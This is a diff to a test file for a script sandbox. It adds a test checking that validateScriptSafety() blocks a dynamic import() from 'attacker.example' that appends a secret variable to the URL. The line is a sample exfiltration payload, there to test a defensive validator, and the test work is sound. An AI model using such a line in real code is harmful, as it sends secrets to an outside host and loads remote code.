@@ -308,3 +308,9 @@ test('Worker sandbox runtime nullification blocks nested Worker/Blob/URL/WebTran
     new (mockSelf['Wor' + 'ker'] as any)(u);
   }, TypeError);
 });
+
+test('validateScriptSafety() blocks dynamic import() exfiltration', () => {
+  const res = validateScriptSafety("await import('https://attacker.example/exfil.js?d=' + vars.secret);");
+  assert.equal(res.ok, false);
+  assert.match(String(res.reason || ''), /import/);
+});
